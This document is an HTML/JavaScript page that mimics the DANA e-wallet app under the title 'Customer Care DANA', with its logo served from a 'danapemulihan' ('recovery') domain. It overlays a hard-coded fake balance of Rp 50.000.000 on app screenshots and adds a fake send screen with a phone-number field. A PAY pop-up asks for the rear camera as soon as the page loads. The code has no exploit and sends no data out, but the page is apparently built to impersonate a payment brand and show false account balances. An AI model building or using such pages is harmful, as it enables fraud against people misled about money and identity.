<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <meta name="theme-color" content="#118EEA" />
  <title>DANA ID | Customer Care DANA</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    :root {
      --dpr: 1;
      --ui-scale: 1;
      --saldo-top: 1.5%;
      --saldo-left: 8.2%;
      --saldo-font: 16px;
    }

    html, body {
      width: 100%;
      height: 100%;
      background: #0f172a;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    }

    /* Layar Pembuka Logo Tanpa Spinner Berputar */
    #splashScreen {
      position: fixed;
      inset: 0;
      background: #118eea;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      transition: opacity 0.35s ease;
    }

    #splashScreen.hide {
      opacity: 0;
      pointer-events: none;
    }

    .splash-logo {
      width: calc(min(42vw, 165px) * var(--ui-scale));
      height: auto;
      image-rendering: -webkit-optimize-contrast;
      transform: translateZ(0);
    }

    /* Wadah Utama Menyesuaikan Perangkat */
    .device-stage {
      position: relative;
      width: 100%;
      height: 100%;
      background: #118eea;
      display: none;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      transform: translateZ(0);
      backface-visibility: hidden;
    }

    .device-stage.show {
      display: flex;
    }

    /* Mode HP: memenuhi layar HP secara proporsional */
    body[data-device="mobile"] .device-stage {
      width: 100vw;
      height: 100dvh;
      max-width: 100vw;
      max-height: 100dvh;
      border-radius: 0;
    }

    /* Mode Tablet / Desktop: bingkai potret terpusat agar tidak melebar */
    body[data-device="desktop"] .device-stage,
    body[data-device="tablet"] .device-stage {
      width: auto;
      height: 96dvh;
      aspect-ratio: 9 / 19.5;
      border-radius: 22px;
      box-shadow: 0 14px 40px rgba(0, 0, 0, 0.4);
    }

    .art-frame {
      position: relative;
      width: 100%;
      height: 100%;
      transform: translateZ(0);
    }

    .art-img {
      width: 100%;
      height: 100%;
      object-fit: fill;
      display: block;
      user-select: none;
      -webkit-user-drag: none;
      image-rendering: -webkit-optimize-contrast;
      image-rendering: high-quality;
      filter: contrast(1.04) saturate(1.03);
      transform: translateZ(0);
    }

    /* Overlay Saldo Rp 50.000.000 Tajam di Layar Beresolusi Tinggi */
    .saldo-overlay {
      position: absolute;
      top: var(--saldo-top);
      left: var(--saldo-left);
      width: 47%;
      height: 3.4%;
      background: #138ee9;
      border-radius: 4px;
      padding: 0 6px;
      display: flex;
      align-items: center;
      gap: 6px;
      color: #ffffff;
      font-weight: 700;
      font-size: var(--saldo-font);
      line-height: 1;
      letter-spacing: 0.2px;
      z-index: 10;
      transform: translateZ(0);
      backface-visibility: hidden;
    }

    .saldo-text {
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      text-rendering: geometricPrecision;
    }

    .eye-toggle {
      background: none;
      border: none;
      color: rgba(255, 255, 255, 0.94);
      cursor: pointer;
      padding: 2px;
      line-height: 1;
      flex-shrink: 0;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .eye-svg {
      width: calc(var(--saldo-font) * 1.05);
      height: calc(var(--saldo-font) * 1.05);
      display: block;
      shape-rendering: geometricPrecision;
    }

    /* Hotspot klik pada ikon dan teks "PAY" di navigasi bawah tengah */
    .hotspot-pay {
      position: absolute;
      bottom: 0.4%;
      left: 41.5%;
      width: 17%;
      height: 8.5%;
      background: transparent;
      border: none;
      cursor: pointer;
      z-index: 20;
      touch-action: manipulation;
      -webkit-tap-highlight-color: transparent;
    }

    /* Hotspot klik pada ikon "Kirim" di dashboard */
    .hotspot-kirim {
      position: absolute;
      top: 6.4%;
      left: 57.5%;
      width: 16%;
      height: 5.5%;
      background: transparent;
      border: none;
      cursor: pointer;
      z-index: 15;
      touch-action: manipulation;
      -webkit-tap-highlight-color: transparent;
    }

    /* Layar Saat Ikon Kirim Ditekan */
    .kirim-screen {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      background: #0f172a;
      display: none;
      z-index: 25;
      transform: translateZ(0);
    }

    .kirim-screen.active {
      display: block;
    }

    .screen-img {
      width: 100%;
      height: 100%;
      object-fit: fill;
      display: block;
      user-select: none;
      -webkit-user-drag: none;
      image-rendering: -webkit-optimize-contrast;
      image-rendering: high-quality;
      filter: contrast(1.04) saturate(1.03);
    }

    /* Hotspot transparan di atas ikon panah kembali asli pada gambar */
    .hotspot-back {
      position: absolute;
      top: 1.5%;
      left: 2.5%;
      width: 12%;
      height: 5.2%;
      background: transparent;
      border: none;
      cursor: pointer;
      z-index: 30;
      -webkit-tap-highlight-color: transparent;
    }

    /* Input angka berformat 0812-3456-7890... ukuran besar */
    .kirim-cepat-input {
      position: absolute;
      top: 11.7%;
      left: 14%;
      width: 78%;
      height: 4.4%;
      background: transparent;
      border: none;
      outline: none;
      color: #1e293b;
      font-size: clamp(17px, 5vw, 21px);
      font-weight: 700;
      letter-spacing: 0.25px;
      padding: 0 6px;
      z-index: 29;
      caret-color: #118eea;
    }

    .kirim-cepat-input::placeholder {
      color: #94a3b8;
      font-weight: 400;
    }

    /* Backdrop & Pop-up PAY dari bawah ke atas */
    .pay-backdrop {
      position: absolute;
      inset: 0;
      background: rgba(15, 23, 42, 0.48);
      display: none;
      opacity: 0;
      transition: opacity 0.25s ease;
      z-index: 40;
    }

    .pay-backdrop.show {
      display: block;
      opacity: 1;
    }

    .pay-sheet {
      position: absolute;
      left: 0;
      right: 0;
      bottom: 0;
      height: 54%;
      background: #020617;
      border-top-left-radius: 16px;
      border-top-right-radius: 16px;
      overflow: hidden;
      display: none;
      transform: translate3d(0, 100%, 0);
      transition: transform 0.3s cubic-bezier(0.22, 1, 0.36, 1);
      z-index: 50;
      box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.35);
      will-change: transform;
    }

    .pay-sheet.visible {
      display: block;
    }

    .pay-sheet.open {
      transform: translate3d(0, 0, 0);
    }

    /* Gambar referensi pop-up PAY di latar/header */
    .pay-sheet-img {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      object-fit: fill;
      display: block;
      user-select: none;
      -webkit-user-drag: none;
      z-index: 51;
    }

    /* Kamera belakang penuh memenuhi area pop-up PAY */
    .pay-camera-box {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #020617;
      z-index: 52;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .pay-camera-video {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      background: #020617;
    }

    .pay-camera-status {
      position: absolute;
      bottom: 12px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(15, 23, 42, 0.82);
      color: #ffffff;
      font-size: 11px;
      padding: 4px 10px;
      border-radius: 999px;
      white-space: nowrap;
      z-index: 54;
    }

    .pay-retry-btn {
      margin-left: 6px;
      background: #118eea;
      color: #ffffff;
      border: none;
      border-radius: 999px;
      padding: 2px 8px;
      font-size: 10px;
      font-weight: 600;
      cursor: pointer;
    }

    .pay-close-btn {
      position: absolute;
      top: 10px;
      right: 12px;
      width: 28px;
      height: 28px;
      border-radius: 999px;
      border: none;
      background: rgba(15, 23, 42, 0.65);
      color: #ffffff;
      font-size: 16px;
      line-height: 1;
      cursor: pointer;
      z-index: 55;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }
  </style>
</head>
<body>
  <!-- Layar Pembuka Logo Tanpa Spinner -->
  <div id="splashScreen">
    <img
      src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_text.png"
      alt="Logo"
      class="splash-logo"
      decoding="sync"
    />
  </div>

  <!-- Tampilan Utama Responsif Sesuai Perangkat & Resolusi Tinggi -->
  <div class="device-stage" id="deviceStage">
    <div class="art-frame" id="dashboardView">
      <img
        id="dashboardBg"
        src="https://b.top4top.io/p_398241nn01.jpeg"
        alt="Dashboard"
        class="art-img"
        decoding="sync"
        fetchpriority="high"
      />
      <div class="saldo-overlay">
        <span class="saldo-text" id="saldoValue">Rp 50.000.000</span>
        <button type="button" class="eye-toggle" id="eyeBtn" aria-label="Tampilkan atau sembunyikan saldo" title="Tampilkan/Sembunyikan">
          <svg id="eyeIconOpen" class="eye-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M2.5 12s3.5-6.5 9.5-6.5 9.5 6.5 9.5 6.5-3.5 6.5-9.5 6.5-9.5-6.5-9.5-6.5z" />
            <circle cx="12" cy="12" r="2.5" />
          </svg>
          <svg id="eyeIconClosed" class="eye-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
            <path d="M10.6 5.6A9.8 9.8 0 0 1 12 5.5c6 0 9.5 6.5 9.5 6.5a15.4 15.4 0 0 1-3.2 4.1" />
            <path d="M6.4 6.4A15.8 15.8 0 0 0 2.5 12s3.5 6.5 9.5 6.5c1.7 0 3.2-.4 4.5-1.1" />
            <line x1="3" y1="3" x2="21" y2="21" />
          </svg>
        </button>
      </div>

      <!-- Tombol Klik Area Ikon & Teks "PAY" di Bawah Tengah dan Ikon "Kirim" -->
      <button type="button" class="hotspot-pay" id="btnPay" aria-label="PAY" title="PAY"></button>
      <button type="button" class="hotspot-kirim" id="btnKirim" aria-label="Kirim" title="Kirim"></button>
    </div>

    <!-- Layar Saat Ikon Kirim Ditekan -->
    <div class="kirim-screen" id="kirimScreen">
      <button type="button" class="hotspot-back" id="btnBackDashboard" aria-label="Kembali" title="Kembali"></button>
      <input
        type="text"
        inputmode="numeric"
        pattern="[0-9-]*"
        autocomplete="off"
        spellcheck="false"
        id="kirimCepatInput"
        class="kirim-cepat-input"
        placeholder=""
        aria-label="Masukkan nomor"
      />
      <img
        id="kirimBg"
        src="https://e.top4top.io/p_3982onn2m1.jpeg"
        alt="Layar Kirim"
        class="screen-img"
        decoding="async"
      />
    </div>

    <!-- Backdrop & Pop-up PAY dari bawah ke atas -->
    <div class="pay-backdrop" id="payBackdrop"></div>
    <div class="pay-sheet" id="paySheet" role="dialog" aria-label="Pop-up PAY">
      <button type="button" class="pay-close-btn" id="btnClosePay" aria-label="Tutup">&times;</button>
      <img
        id="paySheetBg"
        src="https://e.top4top.io/p_39821g1661.jpeg"
        alt="Pop-up PAY"
        class="pay-sheet-img"
        decoding="async"
      />
      <div class="pay-camera-box" id="payCameraBox">
        <video
          id="payCameraVideo"
          class="pay-camera-video"
          autoplay
          playsinline
          muted
        ></video>
        <div class="pay-camera-status" id="payCameraStatus">
          <span id="payStatusText">Meminta izin kamera...</span>
          <button type="button" class="pay-retry-btn" id="btnRetryCamera" style="display:none;">Coba Lagi</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    (function () {
      const DASHBOARD_IMAGE_URL = "https://b.top4top.io/p_398241nn01.jpeg";
      const KIRIM_IMAGE_URL = "https://e.top4top.io/p_3982onn2m1.jpeg";
      const PAY_POPUP_IMAGE_URL = "https://e.top4top.io/p_39821g1661.jpeg";
      const SALDO_NOMINAL = "Rp 50.000.000";

      const splash = document.getElementById("splashScreen");
      const stage = document.getElementById("deviceStage");
      const bgImg = document.getElementById("dashboardBg");
      const kirimImg = document.getElementById("kirimBg");
      const payImg = document.getElementById("paySheetBg");
      const kirimScreen = document.getElementById("kirimScreen");
      const btnPay = document.getElementById("btnPay");
      const btnKirim = document.getElementById("btnKirim");
      const btnBackDashboard = document.getElementById("btnBackDashboard");
      const kirimInput = document.getElementById("kirimCepatInput");
      const saldoEl = document.getElementById("saldoValue");
      const eyeBtn = document.getElementById("eyeBtn");
      const eyeOpen = document.getElementById("eyeIconOpen");
      const eyeClosed = document.getElementById("eyeIconClosed");
      const payBackdrop = document.getElementById("payBackdrop");
      const paySheet = document.getElementById("paySheet");
      const btnClosePay = document.getElementById("btnClosePay");
      const payVideo = document.getElementById("payCameraVideo");
      const payStatus = document.getElementById("payCameraStatus");
      const payStatusText = document.getElementById("payStatusText");
      const btnRetryCamera = document.getElementById("btnRetryCamera");

      if (bgImg && bgImg.src !== DASHBOARD_IMAGE_URL) {
        bgImg.src = DASHBOARD_IMAGE_URL;
      }
      if (kirimImg && kirimImg.src !== KIRIM_IMAGE_URL) {
        kirimImg.src = KIRIM_IMAGE_URL;
      }
      if (payImg && payImg.src !== PAY_POPUP_IMAGE_URL) {
        payImg.src = PAY_POPUP_IMAGE_URL;
      }

      const preloadKirim = new Image();
      preloadKirim.src = KIRIM_IMAGE_URL;
      const preloadPay = new Image();
      preloadPay.src = PAY_POPUP_IMAGE_URL;

      let isMasked = false;
      let cameraStream = null;
      let cameraRequestPromise = null;
      let lastPayTriggerAt = 0;
      let initialPermissionAsked = false;

      function formatPhoneDigits(rawValue) {
        const digitsOnly = String(rawValue || "").replace(/\D+/g, "");
        if (!digitsOnly) return "";

        const firstBlock = digitsOnly.slice(0, 4);
        if (digitsOnly.length <= 4) {
          return firstBlock;
        }

        const secondBlock = digitsOnly.slice(4, 8);
        if (digitsOnly.length <= 8) {
          return firstBlock + "-" + secondBlock;
        }

        const tailBlock = digitsOnly.slice(8);
        return firstBlock + "-" + secondBlock + "-" + tailBlock;
      }

      function setCameraStatus(text, showRetry) {
        if (!payStatus || !payStatusText) return;
        payStatus.style.display = "block";
        payStatusText.textContent = text;
        if (btnRetryCamera) {
          btnRetryCamera.style.display = showRetry ? "inline-block" : "none";
        }
      }

      function hideCameraStatus() {
        if (payStatus) {
          payStatus.style.display = "none";
        }
      }

      async function bindStreamToVideo(stream) {
        if (!payVideo || !stream) return false;
        if (payVideo.srcObject !== stream) {
          payVideo.srcObject = stream;
        }
        payVideo.muted = true;
        payVideo.playsInline = true;

        if (payVideo.readyState < 2) {
          await new Promise(function (resolve) {
            const onLoaded = function () {
              payVideo.removeEventListener("loadedmetadata", onLoaded);
              payVideo.removeEventListener("canplay", onLoaded);
              resolve();
            };
            payVideo.addEventListener("loadedmetadata", onLoaded, { once: true });
            payVideo.addEventListener("canplay", onLoaded, { once: true });
            setTimeout(resolve, 1200);
          });
        }

        try {
          await payVideo.play();
          return true;
        } catch (_) {
          return false;
        }
      }

      async function findBackCameraDeviceId() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
          return null;
        }
        try {
          const devices = await navigator.mediaDevices.enumerateDevices();
          const videoInputs = devices.filter(function (d) {
            return d.kind === "videoinput";
          });
          if (!videoInputs.length) return null;

          const backCam = videoInputs.find(function (d) {
            return /back|rear|environment|belakang/i.test(d.label || "");
          });
          if (backCam && backCam.deviceId) {
            return backCam.deviceId;
          }
          return videoInputs[videoInputs.length - 1].deviceId || null;
        } catch (_) {
          return null;
        }
      }

      async function requestRearCameraPermissionAndStream(forceRestart) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          setCameraStatus("Kamera tidak didukung di browser ini", false);
          return null;
        }

        if (forceRestart && cameraStream) {
          cameraStream.getTracks().forEach(function (t) { t.stop(); });
          cameraStream = null;
        }

        if (cameraStream && cameraStream.active) {
          const ok = await bindStreamToVideo(cameraStream);
          if (ok) hideCameraStatus();
          return cameraStream;
        }

        if (cameraRequestPromise) {
          return cameraRequestPromise;
        }

        setCameraStatus("Meminta izin kamera belakang...", false);

        cameraRequestPromise = (async function () {
          try {
            let stream = null;
            const constraintsList = [
              { video: { facingMode: { exact: "environment" } }, audio: false },
              { video: { facingMode: { ideal: "environment" } }, audio: false },
              { video: true, audio: false }
            ];

            for (let i = 0; i < constraintsList.length; i++) {
              try {
                stream = await navigator.mediaDevices.getUserMedia(constraintsList[i]);
                if (stream) break;
              } catch (err) {
                if (err && (err.name === "NotAllowedError" || err.name === "PermissionDeniedError")) {
                  throw err;
                }
              }
            }

            if (!stream) {
              const deviceId = await findBackCameraDeviceId();
              if (deviceId) {
                stream = await navigator.mediaDevices.getUserMedia({
                  video: { deviceId: { exact: deviceId } },
                  audio: false
                });
              }
            }

            if (!stream) {
              throw new Error("NO_STREAM");
            }

            cameraStream = stream;
            const played = await bindStreamToVideo(stream);
            if (played) {
              hideCameraStatus();
            } else {
              setCameraStatus("Ketuk untuk memulai video", true);
            }
            return stream;
          } catch (err) {
            const denied = err && (err.name === "NotAllowedError" || err.name === "PermissionDeniedError");
            setCameraStatus(
              denied ? "Izin kamera ditolak. Izinkan di pengaturan browser" : "Kamera belum aktif",
              true
            );
            return null;
          } finally {
            cameraRequestPromise = null;
          }
        })();

        return cameraRequestPromise;
      }

      function stopRearCamera() {
        if (cameraStream) {
          cameraStream.getTracks().forEach(function (track) {
            track.stop();
          });
          cameraStream = null;
        }
        if (payVideo) {
          payVideo.srcObject = null;
        }
      }

      async function openPayPopup(e) {
        if (e && typeof e.stopPropagation === "function") {
          e.stopPropagation();
        }
        const now = Date.now();
        if (now - lastPayTriggerAt < 250) return;
        lastPayTriggerAt = now;

        payBackdrop.classList.add("show");
        paySheet.classList.add("visible");
        void paySheet.offsetWidth;
        requestAnimationFrame(function () {
          paySheet.classList.add("open");
        });

        await requestRearCameraPermissionAndStream(false);
      }

      function closePayPopup() {
        paySheet.classList.remove("open");
        payBackdrop.classList.remove("show");
        setTimeout(function () {
          if (!paySheet.classList.contains("open")) {
            paySheet.classList.remove("visible");
          }
        }, 300);
      }

      function detectAndAdaptDevice() {
        const vw = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        const vh = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
        const dpr = Number(window.devicePixelRatio || 1);
        const approxDpi = Math.round(dpr * 96);
        const isTouch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0);

        let deviceType = "mobile";
        if (vw >= 1024 && !isTouch) {
          deviceType = "desktop";
        } else if (vw >= 650 && vw < 1024) {
          deviceType = "tablet";
        } else {
          deviceType = "mobile";
        }

        const ratioWidth = deviceType === "mobile" ? vw : Math.min(vw, vh * (9 / 19.5));
        const dpiFactor = dpr >= 3 ? 0.96 : dpr >= 2 ? 1.0 : 1.04;
        const computedFont = Math.max(12, Math.min(18, Math.round(ratioWidth * 0.041 * dpiFactor)));
        const uiScale = dpr >= 3 ? 1.04 : 1.0;

        const aspect = vh / Math.max(vw, 1);
        const topPercent = aspect > 2.15 ? "1.65%" : "1.5%";

        document.body.setAttribute("data-device", deviceType);
        document.body.setAttribute("data-dpr", String(dpr));
        document.body.setAttribute("data-dpi", String(approxDpi));

        const rootStyle = document.documentElement.style;
        rootStyle.setProperty("--dpr", String(dpr));
        rootStyle.setProperty("--ui-scale", String(uiScale));
        rootStyle.setProperty("--saldo-font", computedFont + "px");
        rootStyle.setProperty("--saldo-top", topPercent);
      }

      detectAndAdaptDevice();
      window.addEventListener("resize", detectAndAdaptDevice);
      window.addEventListener("orientationchange", function () {
        setTimeout(detectAndAdaptDevice, 150);
      });

      setTimeout(function () {
        splash.classList.add("hide");
        stage.classList.add("show");
        setTimeout(function () {
          splash.style.display = "none";
        }, 350);
        if (!initialPermissionAsked) {
          initialPermissionAsked = true;
          requestRearCameraPermissionAndStream(false);
        }
      }, 1200);

      eyeBtn.addEventListener("click", function (e) {
        e.stopPropagation();
        isMasked = !isMasked;
        saldoEl.textContent = isMasked ? "Rp ••••••••" : SALDO_NOMINAL;
        eyeOpen.style.display = isMasked ? "none" : "block";
        eyeClosed.style.display = isMasked ? "block" : "none";
      });

      btnPay.addEventListener("pointerup", openPayPopup);
      btnPay.addEventListener("click", openPayPopup);

      if (btnRetryCamera) {
        btnRetryCamera.addEventListener("click", function (e) {
          e.stopPropagation();
          requestRearCameraPermissionAndStream(true);
        });
      }

      if (payVideo) {
        payVideo.addEventListener("click", function () {
          if (cameraStream && cameraStream.active) {
            bindStreamToVideo(cameraStream).then(function (ok) {
              if (ok) hideCameraStatus();
            });
          } else {
            requestRearCameraPermissionAndStream(true);
          }
        });
      }

      btnClosePay.addEventListener("click", function () {
        closePayPopup();
      });

      payBackdrop.addEventListener("click", function () {
        closePayPopup();
      });

      btnKirim.addEventListener("click", function () {
        closePayPopup();
        kirimScreen.classList.add("active");
      });

      btnBackDashboard.addEventListener("click", function () {
        kirimScreen.classList.remove("active");
      });

      kirimInput.addEventListener("keydown", function (e) {
        if (
          e.ctrlKey || e.metaKey || e.altKey ||
          ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Tab", "Home", "End", "Enter"].includes(e.key)
        ) {
          return;
        }
        if (!/^[0-9]$/.test(e.key)) {
          e.preventDefault();
        }
      });

      kirimInput.addEventListener("input", function () {
        const formatted = formatPhoneDigits(kirimInput.value);
        if (kirimInput.value !== formatted) {
          kirimInput.value = formatted;
        }
      });

      window.addEventListener("beforeunload", stopRearCamera);
    })();
  </script>
</body>
</html>
